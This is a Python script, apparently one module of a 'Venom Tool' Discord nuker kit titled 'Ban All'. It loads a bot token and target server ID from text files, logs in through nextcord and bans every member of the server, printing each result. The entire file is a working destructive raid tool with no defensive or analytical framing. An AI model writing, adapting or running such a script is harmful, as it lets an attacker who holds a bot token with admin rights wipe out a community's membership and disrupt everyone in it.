import os, os.path
from colorama import Fore
import requests, os, sys, re, time, random, os.path, string, subprocess, random, threading, ctypes, shutil
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from utili import *

### SETUP DISCORD ###
import nextcord
from nextcord.errors import LoginFailure
from nextcord.ext import commands
from nextcord.utils import get
from nextcord.errors import Forbidden
intents = nextcord.Intents.default()
intents.members = True
intents.guild_messages = True 
intents.messages = True
intents.guilds = True
nuker = commands.Bot(command_prefix=";",intents=intents)

set_title(f"Venom Tool {VERSIONETOOL} - Ban All")
clear()
filetoken = open("token.txt", "r")
token = filetoken.read()

@nuker.event
async def on_ready():
    clear()
    fileserver = open("server.txt", "r")
    server = fileserver.read()
    serverr = nuker.get_guild(int(server))
    print(F"{m}Bot logged in successfully...." + f'{w}')
    print(f"{m}ID: " + str(nuker.user.id) + f'{w}')
    print(f"{m}Username: " + str(nuker.user.name) + f'{w}')
    print(f"{m}Server ID: " + server + f'{w}')
    for member in serverr.members:
        try:
            await member.ban(reason='')
            print(f'{y}[{b}Venom Tool{y}]{g} Banned {member}{w}')
        except Forbidden:
            print(f'{y}[{b}Venom Tool{y}]{r} Unable to ban {member} [Missing permissions]{w}')
        except:
            print(f'{y}[{b}Venom Tool{y}]{r} Missing permissions {member}{w}')


nuker.run(token)